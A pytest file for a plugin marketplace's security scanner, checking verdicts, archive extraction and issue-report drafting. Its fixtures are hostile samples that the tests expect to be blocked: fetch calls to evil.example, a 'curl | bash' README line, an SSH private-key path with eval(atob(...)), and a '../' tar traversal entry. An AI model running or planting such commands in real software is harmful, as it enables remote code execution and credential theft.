import io
import json
import tarfile
from pathlib import Path
from urllib.parse import unquote, urlparse

from omastore.models import Item
from omastore.scan import (
    HANCORE_ADVISORY_NEW,
    HANCORE_ISSUES_NEW,
    LIMEHAWK_ISSUES_NEW,
    extract_archive,
    first_issue,
    github_archive_urls,
    github_owner_repo,
    open_report,
    report_body,
    report_urls,
    scan_item,
    scan_payload,
    scan_tree,
    scan_items,
)


def _plugin(**kwargs) -> Item:
    data = {
        "kind": "plugin",
        "id": "demo",
        "name": "Demo",
        "install_url": "https://github.com/a/demo",
        "repo": "https://github.com/a/demo",
        "verification": "verified",
    }
    data.update(kwargs)
    return Item(**data)


def _write_tree(base: Path, files: dict[str, str]) -> Path:
    for rel, content in files.items():
        path = base / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content, encoding="utf-8")
    return base


def _make_tar(files: dict[str, str]) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        for name, content in files.items():
            data = content.encode("utf-8")
            info = tarfile.TarInfo(name=f"demo-main/{name}")
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def test_clean_tree_is_clean(tmp_path: Path) -> None:
    root = _write_tree(
        tmp_path,
        {
            "plugin.json": json.dumps({"id": "demo", "name": "Demo", "qml": "main.qml"}),
            "main.qml": "import QtQuick\nText { text: \"hi\" }\n",
        },
    )
    result = scan_tree(_plugin(), root)
    assert result.verdict == "clean"
    assert result.source == "tree"
    assert result.allows_install(False) is True
    assert result.scanned_files >= 2


def test_network_fetch_blocks(tmp_path: Path) -> None:
    root = _write_tree(
        tmp_path,
        {
            "plugin.json": json.dumps({"id": "demo", "qml": "main.qml"}),
            "main.qml": 'fetch("https://evil.example/pwn")\n',
        },
    )
    result = scan_tree(_plugin(), root)
    assert result.verdict == "block"
    categories = {finding.category for finding in result.findings}
    assert "network" in categories
    assert any("fetch(" in finding.why or "evil.example" in finding.why for finding in result.findings)
    assert any(finding.path == "main.qml" and finding.line == 1 for finding in result.findings)
    assert result.allows_install(False) is False
    assert result.allows_install(True) is True


def test_exec_and_hyprctl_block(tmp_path: Path) -> None:
    root = _write_tree(
        tmp_path,
        {
            "hook.sh": 'bash -c "curl evil"\nhyprctl dispatch exec kitty\n',
        },
    )
    result = scan_tree(_plugin(), root)
    assert result.verdict == "block"
    whys = {finding.why for finding in result.findings}
    assert "bash -c" in whys
    assert "hyprctl" in whys
    assert any(finding.category == "process" for finding in result.findings)


def test_qml_process_blocks(tmp_path: Path) -> None:
    root = _write_tree(tmp_path, {"x.qml": "Process { command: \"bash\" }\n"})
    result = scan_tree(_plugin(), root)
    assert result.verdict == "block"
    assert any(finding.why == "QML Process" for finding in result.findings)


def test_secrets_and_obfuscation(tmp_path: Path) -> None:
    blob = "A" * 400
    root = _write_tree(
        tmp_path,
        {
            "steal.js": "const p = '~/.ssh/id_rsa'\neval(atob('" + blob + "'))\n",
        },
    )
    result = scan_tree(_plugin(), root)
    assert result.verdict == "block"
    whys = {finding.why for finding in result.findings}
    assert "~/.ssh" in whys or "id_rsa" in whys
    assert "eval(" in whys
    assert "huge base64 blob" in whys or "atob(" in whys


def test_manifest_missing_file_is_warn(tmp_path: Path) -> None:
    root = _write_tree(
        tmp_path,
        {
            "plugin.json": json.dumps({"id": "demo", "qml": "missing.qml"}),
            "other.qml": "Text {}\n",
        },
    )
    result = scan_tree(_plugin(), root)
    assert result.verdict == "warn"
    assert any("missing file" in finding.why for finding in result.findings)
    assert result.allows_install(True) is True


def test_manifest_parse_fail_is_block(tmp_path: Path) -> None:
    root = _write_tree(tmp_path, {"plugin.json": "{not json"})
    result = scan_tree(_plugin(), root)
    assert result.verdict == "block"
    assert any(finding.category == "manifest" for finding in result.findings)


def test_odd_install_url_blocks_without_fetch(monkeypatch, tmp_path: Path) -> None:
    def boom(*args, **kwargs):
        raise AssertionError("must not fetch an odd install URL")

    monkeypatch.setattr("omastore.scan.fetch_bytes", boom)
    monkeypatch.setattr("omastore.scan.shallow_clone", boom)
    item = _plugin(install_url="https://evil.example/a/b", repo="https://evil.example/a/b")
    result = scan_item(item)
    assert result.verdict == "block"
    assert result.source == "catalog"
    assert result.allows_install(True) is True  # pattern/catalog hit, not a crashed scan
    assert "odd install URL" in result.format_findings()


def test_fetch_fail_is_not_overridable(monkeypatch) -> None:
    def boom(*args, **kwargs):
        raise TimeoutError("nope")

    def no_git(*args, **kwargs):
        raise RuntimeError("git missing")

    monkeypatch.setattr("omastore.scan.fetch_bytes", boom)
    monkeypatch.setattr("omastore.scan.shallow_clone", no_git)
    result = scan_item(_plugin())
    assert result.verdict == "block"
    assert result.source == "failed"
    assert result.error
    assert result.allows_install(False) is False
    assert result.allows_install(True) is False
    assert "scan failed" in result.cli_block_message()


def test_archive_fetch_scans_without_clone(monkeypatch, tmp_path: Path) -> None:
    archive = _make_tar(
        {
            "plugin.json": json.dumps({"id": "demo", "qml": "main.qml"}),
            "main.qml": "Text { text: \"ok\" }\n",
        }
    )
    clones: list[str] = []

    def fake_fetch(url: str, **kwargs) -> bytes:
        assert "github.com/a/demo/archive" in url
        return archive

    monkeypatch.setattr("omastore.scan.fetch_bytes", fake_fetch)
    monkeypatch.setattr("omastore.scan.shallow_clone", lambda *a, **k: clones.append("clone"))
    result = scan_item(_plugin())
    assert clones == []
    assert result.source == "archive"
    assert result.verdict == "clean"


def test_extract_archive_uses_data_filter(tmp_path: Path) -> None:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        info = tarfile.TarInfo(name="../escape.txt")
        data = b"nope"
        info.size = len(data)
        tar.addfile(info, io.BytesIO(data))
    dest = tmp_path / "out"
    try:
        extract_archive(buf.getvalue(), dest)
    except (tarfile.FilterError, tarfile.TarError, ValueError):
        pass
    assert not (tmp_path / "escape.txt").exists()
    if dest.exists():
        assert not list(dest.rglob("escape.txt"))


def test_readme_https_github_is_clean(tmp_path: Path) -> None:
    root = _write_tree(
        tmp_path,
        {
            "README.md": "See https://github.com/a/demo and https://omarchyplugins.com\n",
            "main.qml": "Text {}\n",
        },
    )
    result = scan_tree(_plugin(), root)
    assert result.verdict == "clean"


def test_readme_curl_pipe_bash_blocks(tmp_path: Path) -> None:
    root = _write_tree(tmp_path, {"README.md": "run: curl https://evil.example/x | bash\n"})
    result = scan_tree(_plugin(), root)
    assert result.verdict == "block"
    assert any("curl | bash" in finding.why for finding in result.findings)


def test_shell_json_write_blocks(tmp_path: Path) -> None:
    root = _write_tree(tmp_path, {"hide.js": "saveFile('shell.json', layout)\n"})
    result = scan_tree(_plugin(), root)
    assert result.verdict == "block"
    assert any("shell.json" in finding.why for finding in result.findings)


def test_github_archive_urls() -> None:
    urls = github_archive_urls("https://github.com/a/demo.git")
    assert urls[0] == "https://github.com/a/demo/archive/HEAD.tar.gz"
    assert github_owner_repo("https://github.com/a/demo") == ("a", "demo")


def test_report_urls_never_file_omastore_or_omarchy() -> None:
    item = _plugin()
    from omastore.scan import Finding, ScanResult

    blocked = ScanResult(
        item_key="plugin:demo",
        item_id="demo",
        item_name="Demo",
        kind="plugin",
        repo="https://github.com/a/demo",
        verdict="block",
        findings=[Finding("block", "network", "main.qml", 4, "fetch(")],
        source="tree",
    )
    urls = report_urls(item, blocked)
    assert urls["catalog_issue"].startswith(HANCORE_ISSUES_NEW)
    assert urls["advisory"] == HANCORE_ADVISORY_NEW
    assert urls["plugin_issue"].startswith("https://github.com/a/demo/issues/new")
    blob = urls["catalog_issue"] + urls["plugin_issue"] + urls["advisory"]
    assert "antunesales-dev/omastore" not in blob
    assert "basecamp/omarchy" not in blob
    assert "37signals" not in blob
    parsed = urlparse(urls["catalog_issue"])
    query = unquote(parsed.query)
    assert "plugin:demo" in query
    assert "fetch(" in query
    body = report_body(item, blocked)
    assert "/home/" not in body
    assert "omastore" in body


def test_theme_report_goes_to_limehawk_not_hancore() -> None:
    from omastore.scan import Finding, ScanResult

    item = Item(
        kind="theme",
        id="lumon",
        name="Lumon",
        repo="https://github.com/x/lumon",
        install_url="https://github.com/x/lumon",
    )
    blocked = ScanResult(
        item_key="theme:lumon",
        item_id="lumon",
        item_name="Lumon",
        kind="theme",
        repo=item.repo,
        verdict="block",
        findings=[Finding("block", "process", "install.sh", 1, "bash -c")],
        source="tree",
    )
    urls = report_urls(item, blocked)
    assert urls["catalog_issue"].startswith(LIMEHAWK_ISSUES_NEW)
    assert urls["advisory"] == ""
    assert "omarchy-plugin-marketplace" not in urls["catalog_issue"]


def test_open_report_opens_draft_never_posts(monkeypatch) -> None:
    from omastore.scan import Finding, ScanResult

    item = _plugin()
    blocked = ScanResult(
        item_key="plugin:demo",
        item_id="demo",
        item_name="Demo",
        kind="plugin",
        repo=item.repo,
        verdict="block",
        findings=[Finding("block", "network", "a.qml", 1, "fetch(")],
        source="tree",
    )
    seen: list[str] = []
    result = open_report(item, blocked, opener=seen.append)
    assert result["ok"] is True
    assert seen
    assert "issues/new" in seen[0]
    assert "antunesales-dev/omastore" not in seen[0]


def test_open_report_clipboard_fallback(monkeypatch) -> None:
    from omastore.scan import Finding, ScanResult

    item = _plugin()
    blocked = ScanResult(
        item_key="plugin:demo",
        item_id="demo",
        item_name="Demo",
        kind="plugin",
        repo=item.repo,
        verdict="block",
        findings=[Finding("block", "network", "a.qml", 1, "fetch(")],
        source="tree",
    )
    copied: list[str] = []
    monkeypatch.setattr("omastore.scan.copy_text", lambda text: copied.append(text) or True)
    result = open_report(item, blocked, opener=lambda _url: (_ for _ in ()).throw(RuntimeError("no browser")))
    assert result["copied"] is True
    assert copied
    assert "fetch(" in copied[0]


def test_scan_payload_and_first_issue(tmp_path: Path) -> None:
    clean = scan_tree(
        _plugin(id="ok"),
        _write_tree(tmp_path / "ok", {"a.qml": "Text {}\n"}),
    )
    dirty = scan_tree(
        _plugin(id="bad"),
        _write_tree(tmp_path / "bad", {"a.qml": "fetch('https://evil.example')\n"}),
    )
    assert first_issue([clean, dirty]) is dirty
    payload = scan_payload(dirty)
    assert payload["verdict"] == "block"
    assert payload["allows_install"] is False
    assert payload["findings"]


def test_scan_items_keeps_going(tmp_path: Path, monkeypatch) -> None:
    trees = {
        "a": _write_tree(tmp_path / "a", {"a.qml": "Text {}\n"}),
        "b": _write_tree(tmp_path / "b", {"b.qml": "fetch('https://evil.example')\n"}),
        "c": _write_tree(tmp_path / "c", {"c.qml": "Text {}\n"}),
    }

    def fake_scan(item, *, tree=None):
        return scan_tree(item, trees[item.id])

    monkeypatch.setattr("omastore.scan.scan_item", fake_scan)
    items = [_plugin(id="a"), _plugin(id="b"), _plugin(id="c")]
    results = scan_items(items)
    assert [row.item_id for row in results] == ["a", "b", "c"]
    assert results[0].verdict == "clean"
    assert results[1].verdict == "block"
    assert results[2].verdict == "clean"


def test_verified_is_not_a_skip(tmp_path: Path) -> None:
    root = _write_tree(tmp_path, {"x.qml": "XMLHttpRequest\n"})
    result = scan_tree(_plugin(verification="verified"), root)
    assert result.verdict == "block"
    assert result.allows_install(False) is False
